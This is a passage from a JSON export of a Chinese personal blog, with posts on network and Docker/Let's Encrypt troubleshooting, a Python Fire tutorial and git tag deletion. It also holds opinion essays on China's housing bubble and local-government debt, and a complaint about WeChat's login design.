结果果然是被杭州联通拉黑了，导致无法访问，但是其他网络，比如电信是没问题的。","categories":[],"tags":[{"name":"路由","slug":"路由","permalink":"https://awen.me/tags/%E8%B7%AF%E7%94%B1/"}]},{"title":"Ubuntu 安装 php7.1 无法添加源的故障处理","slug":"Ubuntu-安装-php7-1-无法添加源的故障处理","date":"2018-06-29T21:49:32.000Z","updated":"2021-02-26T06:05:29.267Z","comments":true,"path":"posts/59904.html","link":"","permalink":"https://awen.me/posts/59904.html","excerpt":"有个客户反馈他执行 sudo add-apt-repository -y ppa:andrej/php","text":"有个客户反馈他执行 sudo add-apt-repository -y ppa:andrej/php 报错，如图所示 我第一眼看到报错 unable to resolve host zth5，让用户执行 echo &apos;127.0.0.1 zth5&apos; &gt;&gt; /etc/hosts解决，但是还是不行，提示 解决办法1.排除法 我分别在2个不同的区域去尝试这个命令的执行效果，发现用户所使用的服务器所在区是不行的，100% 复现问题。那就针对这个区的机器进行排查 2.抓包 执行 tcpdump -w phpinstallbug.pcap sz phpinstallbug.pcap然后 用 wireshark 打开该文件发现本地到 91.189.89.223 这个地址不通。 于是反馈给网络组排查发现是路由配置有问题，网络组调整后发现还是不行，连不上 keyserver.ubuntu.com 。 总结这次问题是因为该区到达国外一些地方的路由配置有问题导致的。","categories":[],"tags":[{"name":"linux","slug":"linux","permalink":"https://awen.me/tags/linux/"}]},{"title":"主动捅破泡沫的经济现象及小韭菜该何去何从？ ","slug":"主动捅破泡沫的经济现象及小韭菜该何去何从？","date":"2018-06-29T14:35:50.000Z","updated":"2021-02-26T06:05:29.298Z","comments":true,"path":"posts/21649.html","link":"","permalink":"https://awen.me/posts/21649.html","excerpt":"转 https://zhuanlan.zhihu.com/p/38686637 可能随时被删，遂保留一份 作者：社长小二编辑：莫姗姗 欢迎转发，谢绝转载 最近几天一直被大家催促赶紧出续集。我先跟大家道个歉，由于我是业余写手，平时还有工作，所以无法随心所欲地写作，所以更新速度实在是无法保证，我可以确保的是“重要内容”一周至少出一次。本篇文章紧接着上一篇楼市这泡沫，外面压破是灾难，内部突破是新生结尾的提问来写，重点描述接下来可能会出现的经济现象，也为大家做一个时间预测，同时也为像社长这样的升斗小民能够在经济震荡中保住血汗钱献计献策。与上篇文章一样，先来复习一下常见人物形象：老王：精英型房奴老赵：炒房的“成功人士”社长：半吊子诗人莫姗姗：社团价值观的一面旗帜R总（大哥）：老是称呼其为“大哥”,感觉有点猥琐，毕竟权力那么大，从此以后改称R总。R….Regent，自称老实人的Big Boss。","text":"转 https://zhuanlan.zhihu.com/p/38686637 可能随时被删，遂保留一份 作者：社长小二编辑：莫姗姗 欢迎转发，谢绝转载 最近几天一直被大家催促赶紧出续集。我先跟大家道个歉，由于我是业余写手，平时还有工作，所以无法随心所欲地写作，所以更新速度实在是无法保证，我可以确保的是“重要内容”一周至少出一次。本篇文章紧接着上一篇楼市这泡沫，外面压破是灾难，内部突破是新生结尾的提问来写，重点描述接下来可能会出现的经济现象，也为大家做一个时间预测，同时也为像社长这样的升斗小民能够在经济震荡中保住血汗钱献计献策。与上篇文章一样，先来复习一下常见人物形象：老王：精英型房奴老赵：炒房的“成功人士”社长：半吊子诗人莫姗姗：社团价值观的一面旗帜R总（大哥）：老是称呼其为“大哥”,感觉有点猥琐，毕竟权力那么大，从此以后改称R总。R….Regent，自称老实人的Big Boss。 第1章 经济现象 一、 关于“30城整治楼市乱象”上次我说ZG债务危机积重难返，楼市肿瘤吸血资本，导致内需不振，外部威胁（贸易战）又越来越重。R总别无选择，只能主动刺破楼市泡沫，才能获得经济新生，而且泡沫一定会从炒房的老赵先炸。话音刚落还没凉透，就看到了如下新闻： 老王问社长：“还真被你小子给说中了，这下老赵是不是该倒霉了？” 真是too simple too young。真正让老赵倒霉的，只有房价崩盘，老赵血本无归才能把他送上天台。即使这“七部委”里还有个公安部，也最多把老赵吓一个“心有戚戚”。这样的执法行动和高调宣传，会不会造成房价下跌呢？绝逼不会，R如果想让房价下跌，招数何止100种，这篇文章最大的用处在于“甩锅”——这泡沫都是“炒房客、黑中介、违法开发商、虚假广告”吹起来的，和R老板可一点关系都没有啊。 这样的新闻以后会越来越多，而且我们还会看到具体的查封了多少家“黑中介”、取缔了多少家“违法开发商”、撤下了多少“违规广告”、抓住多少“老赵”。这些都是为楼市泡沫炸裂而做的舆论准备。贪婪的老赵是只标准格式的替罪羊，因为他长的那样子就像，“Majority”也更愿意相信浓眉大眼的R总不是搞高了房价搞坏了经济的祸首，肯定是尖嘴猴腮的老赵。可是老赵也很委屈啊，他不过是跟着R老板后面喝汤而已，真正刮骨吃肉的还是Boss R。只是这次他没看出R老板已经换掉了负债经济的账本，不小心被骗上了贼船。这话也不假，所以他其实也挺可怜的，可是谁让他没有power，还尼玛没有智商呢！ 最近D报痛批楼市乱象的文章也挺火的，不是吗？这个论调多像是莫姗姗说的啊，什么“一座被房价绑架的城市，四处‘抢人’又有何用？”，“如今，房价高居不下、市场投机盛行，老百姓不高兴、不赞成、不答应” …… 听上去R总与无产阶级的莫姗姗成了一边的，难道是莫姗姗情真意切打动了R？R总真是只老狐狸，当初印钱+卖地，躺着发财的时候赚得盆满钵满，现在楼市泡沫玩不下去了，就两手一摊，义正言辞地把锅甩给老赵。这操作真是熟练，反正他浓眉大眼的样子，Majority总是相信他的。 二、关于“货币化棚改”在上一篇文章中，我说“货币化棚改”是一石三鸟的妙计。 在固定投资收益下降至临界点，社会融资额急剧下降的情况下，货币化棚改是大Boss为数不多的发钱手段，更是“人口净流出的三四线城市”去库存缓债务的唯一手段，也是城市化建设实现2020年集体奔小康实现中等富裕伟大目标的必要途径。能想出这一招的朋友，给他发个ZG版诺贝尔经济学奖都不过分。但是，就在前几天，竟然流传出“取消棚改”的消息，导致地产股全线大跌。这从侧面又进一步反应了“棚改”就是当前楼市的重要信心。 后来国开行的领导们明确了，只是“收回了棚改项目的审批权，扩大棚改项目的实物安置比例。”我猜测如此调整的原因有两个：一个是PSL贷款额度有限，需要优先安排给财政危机比较深重的地方Z·F去通过“货币化”安置缓解债务压力，所以就需要由总行收回审批权，统一调配；另一个是这样长期低息（2.75%）的贷款对于欠债就没想还的地方zf来讲简直就跟人参果一样，所以这笔钱批下来是不是专款专用，也未可知，所以就需要总行来进行精准控制。总之，棚改货币化安置的规模在R总的控制下，肯定会越来越小，三四线城市的楼市离开了棚改要是还不扑街的话， 我就让老王裸奔给你们看！ 哎？不是说现在M2增速低到8.3%，央行已经无力推高了吗？不是说货币化棚改是R老板为数不多的发钱手段吗？为什么还要收紧呢？这样不就会进一步造成流动性危机吗？这可不就是Boss R要捅破楼市泡沫的信号么! 看看这条新闻，再联想一下任志强4.22日的言论： 说明什么？说明R总正在卡紧房地产资金的水龙头——开发商没钱了，现在海外高成本的融资都要收紧了。而泡沫市场是靠什么维系起来的？靠大水漫灌的资金！PSL审批收紧，海外融资收紧，国内融资困难，房地产这种对流动资金要求较高的企业还能扛多久？ 三、关于降准！ 前几天总是有人私信我“降准了，了解一下？” “社长，老总又放水了，是不是房价又要翻一番啦？”……废话，好像知道个降准很牛逼似的，满屏的新闻谁看不到？我写经济类的文章总是从最基本的经济理论开始说起，而且挖空心思尽可能用大白话来写，目的就是为了“多数人”能看得明白。 还是罗斯柴尔德·C说得对——Majority 都是愚蠢且易于被煽动的。这些人只要看到降准、看到MLF的字眼就能联想到放水，就有一种智商占领高地的快感，根本不会细致去看R总降准的第一手新闻是怎么写的，更不会去思考降准的深层次原因。他们宁愿相信那些标题是《震惊！房价暴涨的秘密，99%的人都不知道》、《绝密！刚需族不得不看的最新消息》的文章。点开后，就确信了一定要赶！紧！买！房！这就是C国的多数人。那么，这次降准的目的到底是什么？是“为进一步推进市场化法治化”债转股”，加大对小微企业的支持力度。” 债转股，就是说企业以前欠的钱，现在还不上了，那么就先不还了，就当银行购买了企业的股份好了，本来应该还本付息，现在就用分红返还，债权方需要行使股东权力，参与公司重大经营事项。盘活公司以后，就可以上市割韭菜套现还债了，是不是挺美好？而实际中，经营良好，现金流充足的企业用得着“债转股”么？你们公司盈利能力很强，利润高，前景好，你会将蛋糕拱手相送么？ 银行之前一直推脱说没钱，抗拒“债转股”落地，所以才有了这一次的定向降准来“进一步推动”，这就说明银行也不愿意配合债转股。所以原因只有一个，那就是这些烂了账的公司现金流快枯竭了，债务就要还不上了，这坑爹的股份银行也不想要。可是在R总还没有完成杠杆转移之前，不希望这些负债企业炸掉，因为在R总的小本本上，债务泡沫炸裂的优先级顺序是：老赵＞老王＞民企（P2P最先玩完）＞G·企＞小地方Z·F＞大地方Z·F＞R总。 所以R总释放一部分流动性让这些现金流危急的企业苟延残喘一阵子。好让老赵炸在最前面。降准的另一个原因是为了加大对小微企业的支持力度，这个已经是老调重弹了，前两次降准，都有这个由头。大家需要关注的数据是：央行12日晚间公布5月金融数据显示，5月末，广义货币(M2)余额174.31万亿元，同比增长8.3%。值得注意的是，5月社融数据7800亿元，明显低于预期，与4月相比接近腰斩，相比去年同期大幅减少28%。前面的文章都说了：M2增量≥GDP增量+利息。 以上两组数据里（2018年的债务数据我没找到），中国债务总量并没有计算影子银行等表外债务，而实际债务规模是会更大的，姑且将债务总量粗略估计为250万亿元。按利率4.5%计算，每年支付的利息为11.25万亿元。 2017年全年GDP总量为82万亿元，新增5.6万亿元。按这个数据估计，M2增速须得大于9.6%，才能保证不发生钱荒。而5月数据显示，M2增速只有8.3%。所以，降准说到底都是为了补充流动性——说明钱荒正在上演。 另一方面，Z·G央行准备金率16%（一般规模10%左右），有充分的降准空间，预计在未来会有更多的降准动作。 四、关于美联储加息之前说过，美联储缩表加息，Z`G央行就得跟进加息，否则就会造成资本外流。然而为啥Z·G没有加息呢？加息是不可能加息的，这辈子都不可能加息的。因为Z国债务规模太大了啊，加息一个点，就要多还款2.5万亿的利息，M2增速压力会更大，只会进一步造成债务泡沫的破裂。而债务泡沫炸裂前是不可能加息的，债务泡沫破裂后呢？那就更不可能加息了，因为那时候需要货币宽松，开启新一轮的经济增长周期。还记得之前日本央行就是通过加息来刺破经济泡沫的么？可结果就是无差别射杀，导致经济发展长期停滞。 很显然，R总是不会重蹈日本覆辙的，何况R总还有两个日本不具备的优势——Z国经济泡沫仅限于楼市；R总有锁死汇市，限制资金外流的能耐。锁死了外汇，R总就有可以在美联储加息的时候，逆势操作——降准。当然这也是有代价的，那就是本币贬值，而且RMB国际化大大倒退。 泡沫仅限于楼市，是Z国与当年的日本差别最大的地方。当年的日本是全面的经济泡沫，不仅楼市股市全部上天，连高尔夫会员，球场等拥有权都被当成炒作对象。所以对于R总来说，楼市泡沫炸裂是可以的，但是这些没多少泡沫的企业，是不需要跟着陪葬的，于是R总是不会像日本央行一样，通过加息来主动刺破泡沫的，而是选择了定向降准。 上次说了，泡沫总是要破的，不是被继续吹大自己炸掉，就是被外部敌对势力给捅掉。都不如R总计划性地将其动手术割掉，这样还能弃车保帅，而不至于满盘皆输。那么R总捅破泡沫的手段是什么呢？R总的招数也是定向的——只搞楼市。在地方政府债务规模缩减到能够控制的规模（印钱还债），在大型国有银行能够预估出坏账规模，能够有效控制表外负债的时候，就能通过调节给开发商的融资规模与PSL的规模而让开发商资金链断裂，迫使其降价出售资产或者破产。 回顾一下文章的全四节： 《七部委联合开展政治房地产市场乱象专项行动》&amp;D媒对炒房行为义愤填膺地文章。这说明R总已经在开始进行舆论准备，已经找好背锅的了，捅破楼市泡沫之时，经济收缩，Majority怨声载道的时候，就是舆论媒体进一步挞伐老赵们的时刻。 货币化棚改虽然不会突然全部禁止，但是“审批权收归中央”、“提高实物安置比例”就是非常清晰的信号——先从三四线楼市炸起。 降准，是为了弥补流动性补足，防止泡沫炸裂前，企业债务先炸了，从而导致系统性的债务炸裂。而且Z国有充足的降准空间。 R总之所以不加息，一方面是真的加不起（债务太高），另一方面老奸巨猾的R总希望控制债务炸裂的按钮能够把握在自己手里，他会选择一个对自己影响最小的方向去定向爆破。 第2章 捅破泡沫的时间 那么R总会选择什么时间引爆炸弹呢？大家回忆一下任志强在4月份的房地产融资大会上的讲话——“国内开发商2018年上半年就都没钱了，只能去国外寻求成本更高的融资”。而现在，R总不仅捏住了PSL这一开发商资金的命门，发改委还缩紧了国内开发商海外融资的规模。就是说，开发商将会更加无钱可用。老赵不以为然地说：“没有钱大不了不搞开发了呗，那有什么要紧！”老赵你没听说过吗？“2018年下半年，是一个偿债高峰。” 房地产企业的债务周期一般为3年，大家可以看到房地产行业的还债高峰就在2018年的下半年至2019年上半年。所以大家可以关注一下2018年11月到2019年8月之间的信息，届时一定会有一些房地产开发企业转售资产、破产，一定会有一些楼盘烂尾、一定会有更多P2P平台爆雷…… 所以急赶着买房的，09年、12年、15年那么好的上车机会都错过了，也不急着半年一年的吧？就不会拿着现金稍微等一下？R总都做好应对冲击的准备了。 老王：“你说的这么确定，要是没跌怎么办？”我：“没跌就没跌呗，不然你顺着网线爬过来咬我好了。我有啥义务要对你的投资行为负责么？” 第3章 韭菜们的活法 看了《贸易战——趁你病要你命的逻辑》这篇文章跑去买股票的盆友这几天一定很恨我。可能是因为我把“既然你赚了钱又不打算分给我，那亏了钱就别来骂我”说在了前面，所以忍住没来骂我。其实股市大跌期间，新华社连发两稿，足以说明R总呵护A股的决心，这一点我是说对了的。要怪就怪大家对trade war中R总的债务危机不是很有信心，所以赶着跑路发生踩踏了。 我自己是怎么做的？我一直说“美帝搞老二，历来是不分胜负不罢休”，所以在6月14号大量斩仓，躲过了一劫，后面大跌的时候又给接回来了。所以我说的东西有对的地方，肯定也有错的地方。但是我觉得我说的最对的，就是“掌握分析能力才是最重要的”。 大家看文章，最应该关注的别人的理论逻辑，而不要只是去看一个结论。那么韭菜该何去何从呢？ 暂时先别买房，起码先等到过了2019年上半年，房地产企业的债务出清了，没有特别明显的风险了。其实，我觉得最好的时机还是等到R总又开始新一轮的货币宽松——降低利率，降低首付的时候再买。 我仍然觉得股市短期内有机会，应该关注的是现金流充足，负债率低的低端消费类超跌股。现在国家搞消费升级概念，其实民间搞的是消费降级（消费增速已经低到03年非典时期的水平啦），高房价的挤压下，内需已经阳痿了，提振个屁！所以茅台什么的，我不看好，别说我在推什么大蓝筹。 看看这个数据，钱都用来购房还贷了，哪还有什么钱用来消费哦？所以现在居民消费增速跌掉谷底啦，社会融资也几乎腰斩了。 美联储还会有两次加息，而Z国央行则会进一步降准，所以RMB还会接着贬值。其实贬值有利于抵消贸易摩擦造成的外贸损失，对于R总来说是好事。那么。。。换汇？你换得出去再说吧。 美帝号召全世界都别购买伊朗的石油，意味着全球可能会有新一轮的石油危机。这种情况下，很可能会被俄罗斯给摘了桃子，美帝估计也不会容忍这件事情，所以“短期内”，屯油，或者油气存储类企业是个不错的选择。 你有没有听过一个说法：“如果房价腰斩，我都可以买两套了，上海房价要是跌破了的话，那些有钱的人还不去狂扫个几百套？所以这房价根本跌不下来。” 你听到这说法的时候，是不是觉得很有道理？你全部身家1000w，本来就打算买一套房子的，如果房价腰斩了，你不就可以买两套了吗？开心不？那么我问你，你的钱都在哪里呀？你又不是贪官，会堆1000w现金在家里吗？所以你这些钱肯定是有一部分买了理财，一部分投了p2p，一部分买了股票，一部分存在了银行，说不定还有一部分借给别人了……一旦楼市泡沫破裂，大量债务违约，就会引起资金流通收缩，导致一系列的基金、p2p金融机构、地方小银行破产，甚至国有大银行也会紧缩银根防止挤兑。也就是说你这时候很有可能拿不回自己购买基金、p2p的钱，别人对你的债务也会违约，甚至你存在银行的钱，短期内都拿不回来。那么，你拿什么去买两套房哦？这也就是为啥经济学家们总是说在通缩时代，现金为王！关于楼市泡沫的文章写得足够多了，应一位朋友的要求，我下一次打算写一篇科普“汇率”的文章，来预测一下RMB对美元的贬值预期，敬请期待。","categories":[],"tags":[]},{"title":"兴，百姓苦，亡，百姓苦","slug":"兴，百姓苦，亡，百姓苦","date":"2018-06-24T13:02:02.000Z","updated":"2021-02-26T06:05:29.314Z","comments":true,"path":"posts/25034.html","link":"","permalink":"https://awen.me/posts/25034.html","excerpt":"战国后期，周赧(nǎn)王姬延听信楚孝烈王，用天子的名义召集六国出兵伐秦，他让西周公拼凑6000士兵，由于没有军费，只好向富商地主借钱，可六国根本不听他的话，他借的钱很快就花完，债主纷纷上门讨债，他只好隐藏在宫中的一座高台上。因此给后世留下了“债台高筑” 这个成语，不久后，姬延这笔债务消除了，但是是以亡国为代价，后来秦灭六国，这个大家都知道。这大概也是历史上第一次经济危机导致亡国的案例吧，到了现代，这样的事件也在不断发生，比如“希腊”，不停的拖欠债务，然后赖账。","text":"战国后期，周赧(nǎn)王姬延听信楚孝烈王，用天子的名义召集六国出兵伐秦，他让西周公拼凑6000士兵，由于没有军费，只好向富商地主借钱，可六国根本不听他的话，他借的钱很快就花完，债主纷纷上门讨债，他只好隐藏在宫中的一座高台上。因此给后世留下了“债台高筑” 这个成语，不久后，姬延这笔债务消除了，但是是以亡国为代价，后来秦灭六国，这个大家都知道。这大概也是历史上第一次经济危机导致亡国的案例吧，到了现代，这样的事件也在不断发生，比如“希腊”，不停的拖欠债务，然后赖账。 视线拉回到中国，看看最近的新闻以及大家都能够感受到的： 1.因财政入不敷出，湖南耒阳拖欠当地公务员的工资，成为中国首例地方政府欠薪事件。新闻来自搜狐 2.安徽六安教师讨薪新浪 3.阜南县委书记对学生家长喊话：“当官不治孬人比孬人还孬”成网红 新京报 里面就说了阜南县政府欠了很多钱。 4.工资都发不出了，背着40万亿债务的地方政府穷哭了！ 这些新闻都表明目前地方政府日子不好过。地方政府欠了很多钱，还不上，只能靠新债借旧债。看看知乎这个理财文章6万亿地方债喊你买，你敢买吗? 里面说的置换债券: 那么，置换债券又是什么鬼呢？ 置换债券的角色是债务置换。举个例子，地方政府通过发行债券向银行融资了1个亿，本来说好到期连本带息一起还给银行，但是眼见就要到期了，地方政府还不上钱。 怎么办？地方政府灵机一动，再发行置换债券，这个债券将原来要还的1亿元和要还的利息的偿还时间拉长、利率降低。 比如，原来3年期年化利率3.5%，现在通过置换债券变成5年期年化利率2.1%，把短时间高利息的债务置换成长时间低利息的债务，也可以叫做债务展期。这样的话，相当于地方政府在短期内要还的债务和利息减少了，可以缓解压力。 说得更直白一点，债务置换就是借新还旧。地方政府可以通过置换债券继续向银行借钱，对于银行来说就有点悲惨了，钱没收回来不说，还要继续借钱出去。 本质上，地方政府欠下的债务并没有减少，只是延长了还款期限，到了下一次要还钱的时候，再通过置换债券继续借新还旧，至于什么时候能还完，这个就很难说了。央行不断放水印钞票，导致通货膨胀，然后在看看国内各个地方的房价？就连我家那五线城市房价都过万了，为什么中央调控多次房价还是会飙升？还不是因为地方债务太多，政府还不上银行钱！怎么办？地方政府大部分的财政收入大都依赖卖地，看看这个数据35城土地财政依赖度榜，谁尴了谁的尬？,中央调控不是为了房价跌，而是为了不让房价降，这样地方政府就可以通过卖地来还钱了，本来这个债务是在政府、银行、开发商那里，通过这种方式一转换 这个债务就分摊到了 P 民手上了。 通过房地产转换债务，这才是核心。 2016年的网友分析：本轮房价上涨本质：掩护30万亿地方债转移 为什么是房地产？ 因为没有什么商品比房地产更适合转嫁，要知道中国个人是没有破产法的，你欠银行钱，除非你挂了，否则都是要还的，否则会拉进黑名单，不能坐飞机、不能坐高铁，限制消费，诚信这种东西只适合约束 P 民，权贵？不存在的！ 中国的房价泡沫有多严重？我们可以以国际通用的租售比来确定下泡沫严重程度。 什么是租售比？房屋租售比是指每平方米使用面积的月租金与每平方米建筑面积房价之间的比值。国际上用来衡量一个区域房产运行状况良好的租售比一般界定为1∶300~1∶200。如果租售比高于1∶300，意味着房产投资价值相对变小，房产泡沫已经显现；如果低于1∶200，表明这一区域房产投资潜力相对较大，后市看好。租售比无论是高于1∶300还是低于1∶200，均表明房产价格偏离理性真实的房产价值。 套用这个公式我随便找了一个小区算了下，府新花园一套120平米的房子月租金4200，合平均每平米租金= 4200/120 = 35，目前小区房价 49385，租售比 =49385/35 = 1411 = 1:1411 然后看看最近的各地抢人才大战，哪里是抢人才，真的为了人才吗?要看清本质，大学生满地的今天，可以说本科文凭是非常不值钱的。各大二线城市抢人无非就是在找接盘侠，在本地购房需求不够旺盛(房价水平较低)的前提下，从全国各地集资，掏空家里的六个钱包，去库存，拉高本地房价。 参考:各地“抢人大战”的真相 以上数据全部来自互联网各大媒体的报道，我只是搬运工。 其实想说的就是，P 民在哪个朝代都很苦逼啊！拿着刚过温饱线的工资。买不起房。“安得广厦千万间 大庇天下寒士俱欢颜”啊！ 尤其是像我这样从农村出来的，好不容易读个破大学，没想到毕业就失业了，因为专业原因工资特别低，然后转行吧，找了份工资还不错的工作，至少目前单位在国内待遇还是可以的，原本以为可以努力努力就有希望有奔头，可是越看这形式越觉得没救了。 我连韭菜都不是。家里也帮不上忙。没有希望，没有奔头！ 资本社会（别告诉我中国是什么社会主义，其实就是资本主义社会，一样黑）对于底层就是压榨剥削。我姑父在工地上班上个月刚意外死亡，工作时间死在工地上。现在还在打官司。 我一同学初中毕业就出来混，现在有房有车有老婆。反倒是那些读书成绩还不错，读了大学的出来可能是连工作都很难找到的。可能有人说这是幸存者偏差，但是早出来混的现在很可能已经攒下不少资本了。而后来的可能连个房子都买不起。 这他妈的就是命！","categories":[],"tags":[{"name":"随笔","slug":"随笔","permalink":"https://awen.me/tags/%E9%9A%8F%E7%AC%94/"}]},{"title":"Google 的 Fire 轻松实现命令行小工具","slug":"Google-的-Fire-轻松实现命令行小工具","date":"2018-06-23T09:05:15.000Z","updated":"2021-02-26T06:05:29.247Z","comments":true,"path":"posts/17574.html","link":"","permalink":"https://awen.me/posts/17574.html","excerpt":"来自谷歌博客","text":"来自谷歌博客 今天，我们高兴地宣布 Python Fire 将开放源代码。Python Fire 可根据任何 Python 代码生成命令行界面 (CLI)。只需在任何 Python 程序中调用 Fire 函数，便可自动将该程序转变成 CLI。这个内容库可通过“pip install fire”从 pypi 获得，其源代码在 GitHub 上公开。 Python Fire 可自动将您的代码转变成 CLI，无需您做任何额外工作。您不必定义参数，设置帮助信息，或者编写定义代码运行方式的 main 函数。相反，您只需从 main 模块调用“Fire”函数，其余工作全部交由 Python Fire 来完成。它利用检查将您提供的任何 Python 对象（无论是类、对象、字典、函数甚至整个模块）转变成一个 Tab 命令补全和文档齐备的命令行界面，并且这个 CLI 甚至能在代码发生变化时即时更新。 让我们通过一个简单的示例加以说明。 #!/usr/bin/env python import fire class Example(object): def hello(self, name=&apos;world&apos;): &quot;&quot;&quot;Says hello to the specified name.&quot;&quot;&quot; return &apos;Hello {name}!&apos;.format(name=name) def main(): fire.Fire(Example) if __name__ == &apos;__main__&apos;: main() 运行 Fire 函数时将会执行我们的命令。现在我们只需调用 Fire，就可以将 Example 类当作命令行实用程序来使用。 $ ./example.py hello Hello world! $ ./example.py hello David Hello David! $ ./example.py hello --name=Google Hello Google! 当然，您可以继续像使用普通 Python 内容库那样使用此模块，从而能够从 Bash 和 Python 使用完全相同的代码。如果您要编写 Python 内容库，则试用就不再需要更新 main 方法或客户端；相反，您只需从命令行运行所试用的内容库片段。即使内容库发生变化，命令行工具也能即时更新。 在 Google，工程师们利用 Python Fire 根据 Python 内容库生成命令行工具。我们的一个图像处理工具就是将 Fire 与 Python 成像内容库 (PIL) 配合使用生成的。在 Google Brain 团队，我们使用的试验管理工具也是使用 Fire 生成的，通过它从 Python 或 Bash 管理试验的效果同样好。 每个 Fire CLI 都自带交互模式。运行 CLI 时带“–interactive”标志可启动一个 IPython REPL，其中包含命令的结果以及其他已经定义并可随时使用的有用变量。请务必查看 Python Fire 的文档，了解 Fire 提供的这项功能以及其他有用功能的更多信息。 考虑到 Python Fire 简单易用、通用性强并且功能强大，我们希望您能在自己的项目中发现它的用武之地。 仓库地址:https://github.com/google/python-fire 自己练手# -*- coding: UTF-8 -*- import sys try: import requests import fire except ImportError: print(&quot;Please install requests fire &quot;) sys.exit(1) def query(domain): url = &quot;https://sapi.k780.com&quot; querystring = {&quot;app&quot;: &quot;domain.beian&quot;, &quot;domain&quot;: domain, &quot;appkey&quot;: &quot;xxx&quot;, &quot;sign&quot;: &quot;xxxxx&quot;, &quot;format&quot;: &quot;json&quot;} headers = { &apos;Cache-Control&apos;: &quot;no-cache&quot;, } response = requests.request(&quot;GET&quot;, url, headers=headers, params=querystring) res_json = response.json() issuccess = int(res_json[&apos;success&apos;]) isstatus = res_json[&apos;result&apos;][&quot;status&quot;] if issuccess == 1: if isstatus == &quot;ALREADY_BEIAN&quot;: print(&quot;域名已备案&quot;) elif isstatus == &quot;NOT_BEIAN&quot;: print(&quot;域名未备案&quot;) elif isstatus == &quot;WAIT_PROCESS&quot;: print(&quot;等待系统处理&quot;) elif issuccess == 0: print(&quot;系统错误&quot;) if __name__ == &apos;__main__&apos;: fire.Fire(query) 效果 ➜ www beian Fire trace: 1. Initial component 2. (&apos;The function received no value for the required argument:&apos;, &apos;domain&apos;) Type: function String form: &lt;function query at 0x10ee70378&gt; File: Beian.py Usage: beian DOMAIN beian --domain DOMAIN ➜ www beian --domain baidu.com 域名已备案 ➜ www beian awen.me 域名已备案 ➜ www","categories":[],"tags":[]},{"title":"吐槽微信的产品设计","slug":"吐槽微信的产品设计","date":"2018-06-23T08:36:27.000Z","updated":"2021-02-26T06:05:29.321Z","comments":true,"path":"posts/2669.html","link":"","permalink":"https://awen.me/posts/2669.html","excerpt":"因为自己的工作原因每天都必须要用微信和客户联系（实在想不通为啥要用微信来进行工作上的沟通，这么烂的软件)，但是没办法我不是老板。公司要求我不得已而为之。","text":"因为自己的工作原因每天都必须要用微信和客户联系（实在想不通为啥要用微信来进行工作上的沟通，这么烂的软件)，但是没办法我不是老板。公司要求我不得已而为之。 说实话，我是真心讨厌包括微信在内的这些傻逼软件非要把登录设计成扫描二维码登录，你能想象一下开着电脑还得在伸手去拿手机打开微信扫描屏幕才能登陆是有多脑残吗？扫了之后有时候就一直卡住，移动端微信也不弹出要你确认登陆，然后你又得重新扫描这样傻逼似的场景吗？ 而且登陆过后，这个是有过期时间的，过期了或者你干个啥退出了微信又得重新扫描。我自己私人电脑为什么就不能做个免密登陆。 之前在github 找了个免密登陆和多开的插件，但是使用的时候经常登不进去，总是卡在登陆的地方。 不要告诉我什么安全层面考虑，隐私考虑，国产的软件有隐私？设计个输入用户名和密码的选项有那么难吗？愿意扫码的扫码去 愿意用账号密码登录的账号密码登录去。微信这么烂的设计，还非要媒体吹出花来说的多伟大似的。","categories":[],"tags":[{"name":"随笔","slug":"随笔","permalink":"https://awen.me/tags/%E9%9A%8F%E7%AC%94/"}]},{"title":"git 删除本地和远程标签","slug":"git-删除本地和远程标签","date":"2018-06-20T07:55:32.000Z","updated":"2021-02-26T06:05:29.273Z","comments":true,"path":"posts/327.html","link":"","permalink":"https://awen.me/posts/327.html","excerpt":"","text":"git 要删除标签，操作步骤如下: ➜ docker-nginx git:(master) git tag -d v1.1.1 Deleted tag &apos;v1.1.1&apos; (was cecd558) ➜ docker-nginx git:(master) git push origin :refs/tags/v1.1.1 To gitlab.v5linux.com:fangwenjun/nginx-docker.git - [deleted] v1.1.1","categories":[],"tags":[{"name":"git","slug":"git","permalink":"https://awen.me/tags/git/"}]},{"title":"将Let'sencrypt装载到容器中实现自动申请自动续订所遇到的坑","slug":"将Let-sencrypt装载到容器中实现自动申请自动续订所遇到的坑","date":"2018-06-19T14:51:50.000Z","updated":"2021-02-26T06:05:29.332Z","comments":true,"path":"posts/62233.html","link":"","permalink":"https://awen.me/posts/62233.html","excerpt":"准备把我的博客放在容器中，由于我的博客使用了 let’s encrypt，我希望把他也加入到容器中实现自动签发证书的自动化功能。不过在这个过程中我遇到了很多问题，现在就遇到的问题进行一些小小的总结。","text":"准备把我的博客放在容器中，由于我的博客使用了 let’s encrypt，我希望把他也加入到容器中实现自动签发证书的自动化功能。不过在这个过程中我遇到了很多问题，现在就遇到的问题进行一些小小的总结。 签名错误首先，遇到的第一个问题就是当执行 docker build 时 总是会卡在下载 acme.sh 认证这步，报错 Specified signature is not matched with our calculation. server string to sign ....谷歌一番发现这个是阿里云的 API 报的错误，签名有问题，可是我在本地测试是 OK 的啊。肯定是少了什么东西，检查一番发现是容器内的时间是 UTC 的 要比 GMT 的时间少8小时。于是要解决这个办法就是在 dockerfile 中加入一句 RUN ln -sf /usr/share/zoneinfo/Asia/Shanghai /etc/localtime 这样就不会有问题了。 下载 acme.sh 出错在我一开始之间使用以下命令去下载 acme.sh 时总是会build 失败 RUN wget -O - https://get.acme.sh | sh后来调整为 RUN [&quot;/bin/bash&quot;, &quot;-c&quot;, &quot;set -o pipefail &amp;&amp; wget -O - https://get.acme.sh | sh&quot;] 则没有问题，当然执行签发证书时候也需要这样写 RUN [&quot;/bin/bash&quot;, &quot;-c&quot;, &quot;set -o pipefail &amp;&amp; /root/.acme.sh/acme.sh --issue -d awen.me -d *.awen.me --dns dns_cf --keylength ec-256 --debug&quot;]否则可能会出现请求超时异常退出无法继续 build。 too many certificates already issued for exact set of domains在申请证书时候，我们需要加上 –debug，否则如果出现异常我们无法判断是哪里出了问题 /root/.acme.sh/acme.sh --issue -d awen.me -d *.awen.me --dns dns_cf --keylength ec-256 --debug当开启 debug 后，build 镜像提示 [Tue Jun 19 22:44:33 CST 2018] {&quot;type&quot;:&quot;urn:ietf:params:acme:error:rateLimited&quot;,&quot;detail&quot;:&quot;Error finalizing order :: too many certificates already issued for exact set of domains: *.awen.me,awen.me: see https://letsencrypt.org/docs/rate-limits/&quot;,&quot;status&quot;: 429} [Tue Jun 19 22:44:33 CST 2018] _on_issue_err [Tue Jun 19 22:44:33 CST 2018] Please add &apos;--debug&apos; or &apos;--log&apos; to check more details. [Tue Jun 19 22:44:33 CST 2018] See: https://github.com/Neilpang/acme.sh/wiki/How-to-debug-acme.sh [Tue Jun 19 